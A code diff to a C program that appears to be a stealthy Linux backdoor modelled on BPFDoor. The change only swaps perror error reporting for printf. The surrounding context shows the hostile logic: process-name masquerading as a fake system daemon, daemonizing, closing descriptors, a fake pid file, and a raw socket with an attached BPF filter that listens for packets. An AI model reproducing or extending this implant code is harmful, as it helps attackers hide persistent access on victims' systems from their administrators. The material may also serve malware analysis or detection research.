@@ -13,6 +13,7 @@
 #include <linux/ip.h>
 #include <linux/tcp.h>
 #include <string.h>
+#include <errno.h>
 
 #define FAKE_PID_FILE "/var/run/haldrund.pid"
 #define FAKE_COMM "/usr/libexec/haldrund"
@@ -278,12 +279,12 @@ int main(int ac, char** av) {
 
     puts("Hidding itself...");
     if (prctl(PR_SET_NAME, (unsigned long)FAKE_COMM, 0, 0, 0) != 0) {
-        perror("prctl");
+        printf("prctl: %s\n", strerror(errno));
     }
 
     int fd = fork();
     if (fd < 0) {
-        perror("fork");
+        printf("fork: %s\n", strerror(errno));
         return (-1);
     } else if (fd > 0) {
         puts("Parent exiting...");
@@ -293,19 +294,19 @@ int main(int ac, char** av) {
 
     puts("New session...");
     if (setsid() < 0) {
-        perror("setsid");
+        printf("setsid: %s\n", strerror(errno));
     }
 
     puts("Changing working dir...");
     if (chdir("/") < 0) {
-        perror("chdir");
+        printf("chdir: %s\n", strerror(errno));
     }
 
     if (!debug) {
         puts("Closing fds...");
         int nullfd = openat(AT_FDCWD, "/dev/null", O_RDWR);
         if (nullfd < 0) {
-            perror("openat");
+            printf("openat: %s\n", strerror(errno));
             return (1);
         }
         close(0);
@@ -320,7 +321,7 @@ int main(int ac, char** av) {
     puts("Create fake pid file...");
     int pidfd = creat(FAKE_PID_FILE, 0644);
     if (pidfd < 0) {
-        perror("fake pid file creation:");
+        printf("fake pid file creation: %s\n", strerror(errno));
         return (-1);
     }
     close(pidfd);
@@ -328,7 +329,7 @@ int main(int ac, char** av) {
     puts("Create socket...");
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     if (sock < 0) {
-        perror("socket");
+        printf("socket: %s\n", strerror(errno));
         return (-1);
     }
 
@@ -338,7 +339,7 @@ int main(int ac, char** av) {
         .filter = bpf_code,
     };
     if (setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &bpf_prog, sizeof(bpf_prog)) < 0) {
-        perror("setsockopt");
+        printf("setsockopt: %s\n", strerror(errno));
         return (-1);
     }
 
@@ -347,7 +348,7 @@ int main(int ac, char** av) {
     while (1) {
         int recv = recvfrom(sock, buf, sizeof(buf), 0, NULL, NULL);
         if (recv < 0) {
-            perror("recvfrom");
+            printf("recvfrom: %s\n", strerror(errno));
             return (-1);
         }
     }
